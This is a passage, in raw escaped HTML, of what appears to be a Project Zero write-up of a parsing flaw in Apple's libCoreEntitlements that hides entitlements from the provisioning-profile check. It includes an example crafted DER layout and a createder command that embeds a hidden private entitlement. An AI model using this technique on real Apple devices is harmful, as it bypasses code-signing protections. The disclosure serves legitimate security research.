userspace (as libCoreEntitlements.dylib) and in the OS kernel (as a part of &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;AppleMobileFileIntegrity&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;kernel extension). So any vulnerability related to parsing the DER entitlement format would be located there.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;ldquo;There are no vulnerabilities here&amp;rdquo;, I declared in one of the Project Zero team meetings. At the time, I based this claim on the following:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_h97ui6n3g8c8-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;There is a single library for parsing DER entitlements, unlike the &lt;/span&gt;&lt;span&gt;four&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;/five used for XML entitlements. While there are two versions of the library, in userspace and kernel, those appear to be the same. Thus, there is no potential for parsing differential bugs like Psychic Paper. In addition to this, binary formats are much less susceptible to such issues in the first place.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c2\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_h97ui6n3g8c8-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;The library is &lt;/span&gt;&lt;span&gt;quite&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;small. I both reviewed and fuzzed the library for memory corruption vulnerabilities and didn&amp;rsquo;t find anything.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;It turns out I was completely wrong (as it often happens when someone declares code is bug free). But first&amp;hellip;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"wUhACgDjbS-c9\" id=\"h.oj2j45cupao4\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c21\"&gt;Interlude: SHA1 Collisions&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;After my failure to find a good libCoreEntitlements bug, I turned to other ideas. One thing I noticed when digging into Apple integrity checks is that SHA1 is still supported as a valid hash type for Code Directory / cdHash. Since practical SHA1 collision attacks have been known for some time, I wanted to see if they can somehow be applied to break the entitlement check.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;It should be noted that there are two kinds of SHA1 collision attacks:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_5nbkgo2blvl3-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Identical prefix attacks, where an attacker starts with a common file prefix and then constructs collision blocks such that SHA1(prefix + collision_blocks1) == SHA1(prefix + collision_blocks2).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_5nbkgo2blvl3-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Chosen prefix attacks, where the attacker starts with two different prefixes chosen by the attacker and constructs collision blocks such that SHA1(prefix1 + collision_blocks1) == SHA1(prefix2 + collision_blocks2).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c2\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;While both attacks are currently practical against SHA1, the first type is significantly cheaper than the second one. According to &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://eprint.iacr.org/2020/014.pdf\"&gt;SHA-1 is a Shambles&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;paper from 2020, the authors report a &amp;ldquo;cost of US$ 11k for a (identical prefix) collision, and US$ 45k for a chosen-prefix collision&amp;rdquo;. So I wanted to see if an identical prefix attack on DER entitlements is possible. Special thanks to Ange Albertini for bringing me up to speed on the current state of SHA1 collision attacks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;My general idea was to&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_pb72mncojys1-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Construct two sets of entitlements that have the same SHA1 hash&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Since entitlements will have the same SHA1 hash, the cdHash of the corresponding binaries will also be the same, as long as the corresponding Code Directories use SHA1 as the hash algorithm.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;Exploit a race condition and switch the binary between being opened by the kernel and being opened by &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c4 wUhACgDjbS-c30\"&gt;amfid&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;If everything goes well, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;is going to see one set of entitlements and the kernel another set of entitlements, while believing that the binary hasn&amp;rsquo;t changed.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c2\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;In order to construct an identical-prefix collision, my plan was to have an entitlements file that contains a long string. The string would declare a 16-bit size and the identical prefix would end right at the place where string length is stored. That way, when a collision is found, lengths of the string in two files would differ. Following the lengths would be more collision data (junk), but that would be considered string content and the parsing of the file would still succeed. Since the length of the string in two files would be different, parsing would continue from two different places in the two files. This idea is illustrated in the following image.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c20\"&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c20\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKH4YXCWNDGpdZpJY-pcTZcKjJDNFfkMBFIjM37d1kbkxhKV0mmf3rc-NqA7GPuolVdoPRR5z294n68KjKI5GHUOlBS5dK-M-UiQPAkHZr1SO8Zafcv7e5sY6QyLrxnqqcqCjGERmAks1i6xk0IyIhZj6pfViJwl21tiaxoGFFyPJwihmUEn2vPMG6/s388/image3.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKH4YXCWNDGpdZpJY-pcTZcKjJDNFfkMBFIjM37d1kbkxhKV0mmf3rc-NqA7GPuolVdoPRR5z294n68KjKI5GHUOlBS5dK-M-UiQPAkHZr1SO8Zafcv7e5sY6QyLrxnqqcqCjGERmAks1i6xk0IyIhZj6pfViJwl21tiaxoGFFyPJwihmUEn2vPMG6/s388/image3.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\"title=\"\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c20\"&gt;&lt;span&gt;A (failed) idea for exploiting an identical prefix SHA1 collision against DER entitlements. The blue parts of the files are the same, while &lt;/span&gt;&lt;span&gt;green and the red part&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;represent (different) collision blocks.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Except it won&amp;rsquo;t work.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;The reason it won&amp;rsquo;t work is that every object in DER, including an object that contains other objects, has a size. Once again, hat tip to Ange Albertini who pointed out right away that this is going to be a problem.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Since each individual entitlement is stored in a separate sequence object, with our collision we could change the length of a string inside the sequence object (e.g. a value of some entitlement), but not change the length of the sequence object itself. Having a mismatch between the sequence length and the length of content inside the sequence could, depending on how the parser is implemented, lead to a parsing failure. Alternatively, if the parser was more permissive, the parser would succeed but would continue parsing after the end of the current sequence, so the collision wouldn&amp;rsquo;t cause different entitlements to be seen in two different files.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Unless the sequence length is completely ignored.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;So I took another look at the library, specifically at how sequence length was handled in different parts of the library, and that is when I found the actual bug.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"wUhACgDjbS-c9\" id=\"h.d4pdjgxvhjix\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c21\"&gt;The actual bug&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;libCoreEntitlements does not implement traversing DER entitlements in a single place. Instead, traversing is implemented in (at least) three different places:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_c2aw6txn2xw5-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;Inside &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;recursivelyValidateEntitlements&lt;/span&gt;&lt;span&gt;, called from &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEValidate&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is used to validate entitlements before being loaded (e.g. &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEValidate&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called from &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEManagedContextFromCFData &lt;/span&gt;&lt;span&gt;which&lt;/span&gt;&lt;span&gt;&amp;nbsp;was mentioned before). Among other things, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEValidate&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;ensures that entitlements are in alphabetical order and there are no duplicate entitlements.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_vm_iterate&lt;/span&gt;&lt;span&gt;, which is used when converting entitlements to dictionary (&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEQueryContextToCFDictionary&lt;/span&gt;&lt;span&gt;), but also from &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextIsSubset&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_vm_execute_nocopy&lt;/span&gt;&lt;span&gt;, which is used when querying entitlements using &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;API.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;The actual bug is that these traversal algorithms behave slightly differently, in particular in how they handle entitlement sequence length. &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_vm_iterate&lt;/span&gt;&lt;span&gt;&amp;nbsp;behaved correctly and, after processing a single key/value sequence, continued processing after the sequence end (as indicated by the sequence length). &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;recursivelyValidateEntitlements&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_vm_execute_nocopy&lt;/span&gt;&lt;span&gt;&amp;nbsp;however completely ignore the sequence length (beyond an initial check that it is within bounds of the entitlements blob) and, after processing a single entitlement (key/value sequence), would continue processing after the end of the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c29\"&gt;value&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;. This difference in iterating over entitlements is illustrated in the following image.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c20\"&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c20\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmvwezbU_bZy1U1HC0Q6sUq3JUoC-jU2MpAhMjCdDg8-BGmChj0b9dJKuuU2c5jSLIZFcx19cVcw6tTK693jo5NGAFdJJbDx1fLPK5sJ2oijvW6nMa4Q-d7s4yz0JQSmL8LIWIToeqeA14Y8OvS2xC-oS4qZ3v-4a7NAYoTM3X7_EXnHU9MnLRQBor/s473/image1.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmvwezbU_bZy1U1HC0Q6sUq3JUoC-jU2MpAhMjCdDg8-BGmChj0b9dJKuuU2c5jSLIZFcx19cVcw6tTK693jo5NGAFdJJbDx1fLPK5sJ2oijvW6nMa4Q-d7s4yz0JQSmL8LIWIToeqeA14Y8OvS2xC-oS4qZ3v-4a7NAYoTM3X7_EXnHU9MnLRQBor/s473/image1.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\"title=\"\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c20\"&gt;&lt;span&gt;Illustration of how different algorithms within libCoreEntitlements traverse the same DER structure. &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_vm_iterate&lt;/span&gt;&lt;span&gt;&amp;nbsp;is &lt;/span&gt;&lt;span&gt;shown as green arrows&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;on the left while &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_vm_execute&lt;/span&gt;&lt;span&gt;&amp;nbsp;is shown as red arrows on the right&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;. The red parts of the file represent a &amp;ldquo;hidden&amp;rdquo; entitlement that is only visible to the second algorithm.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;This allowed hiding entitlements by embedding them as children of other entitlements, as shown below. Such entitlements would then be visible to &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEValidate&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span&gt;, but hidden from &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEQueryContextToCFDictionary&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextIsSubset&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.049393eeee169e67583853ed549fe2b5bc2da995\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"wUhACgDjbS-c35\"&gt;&lt;tr class=\"wUhACgDjbS-c14\"&gt;&lt;td class=\"wUhACgDjbS-c36\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;application&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;identifier&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;:testapp&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c22 wUhACgDjbS-c5 wUhACgDjbS-c27\"&gt;&amp;nbsp; SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c22 wUhACgDjbS-c5 wUhACgDjbS-c27\"&gt;&amp;nbsp; &amp;nbsp; UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;:com.apple.private.foo&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c22 wUhACgDjbS-c5 wUhACgDjbS-c27\"&gt;&amp;nbsp; &amp;nbsp; UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;:bar&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;get&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;task&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;allow&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; BOOLEAN &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;255&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Luckily (for an attacker), the functions used to perform the check that all entitlements in the binary are a subset of those in the provisioning profile wouldn&amp;rsquo;t see these hidden entitlements, which would only surface when the kernel would query for a presence of a specific entitlement using the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;API.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Since &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEValidate&lt;/span&gt;&lt;span&gt;&amp;nbsp;would also see the &amp;ldquo;hidden&amp;rdquo; entitlements, these would need to be in alphabetical order together with &amp;ldquo;normal&amp;rdquo; entitlements. However, because generally allowed entitlements such as &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;application-identifier&lt;/span&gt;&lt;span&gt;&amp;nbsp;on iOS and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;com.apple.application-identifier&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;on macOS appear pretty soon in the alphabetical order, this requirement doesn&amp;rsquo;t pose an obstacle for exploitation.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"wUhACgDjbS-c9\" id=\"h.f25ljzimqosv\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c21\"&gt;Exploitation&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;In order to try to exploit these issues, some tooling was required. Firstly, tooling to create crafted entitlements DER. For this, I created a small utility called &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=575126\"&gt;createder.cpp&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;which can be used for example as &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;./createder entitlements.der com.apple.application-identifier=testapp -- com.apple.private.security.kext-collection-management&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c32\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;where entitlements.der is the output DER encoded entitlements file, entitlements before &amp;ldquo;--&amp;rdquo; are &amp;ldquo;normal&amp;rdquo; entitlements and those after &amp;ldquo;--&amp;rdquo; are hidden.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Next, I needed a way to embed such crafted entitlements into a signature blob. Normally, for signing binaries, Apple&amp;rsquo;s &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c23\"&gt;codesign&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;utility is used. However, this utility only accepts XML entitlements as input and the user can&amp;rsquo;t provide a DER blob. At some point, codesign converts the user-provided XML to DER and embeds both in the resulting binary.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;I decided the easiest way to embed custom DER in a binary would be to modify codesign behavior, specifically the XML to DER conversion process. To do this, I used &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://github.com/googleprojectzero/TinyInst\"&gt;TinyInst&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;, a dynamic instrumentation library I developed together with contributors. TinyInst currently supports macOS and Windows.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;In order to embed custom DER, I hooked two functions from libCoreEntitlements that are used during XML to DER conversion: &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESizeSerialization&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESerialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESerializeWithOptions&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;on macOS 13 / iOS 16). The first one computes the size of DER while the second one 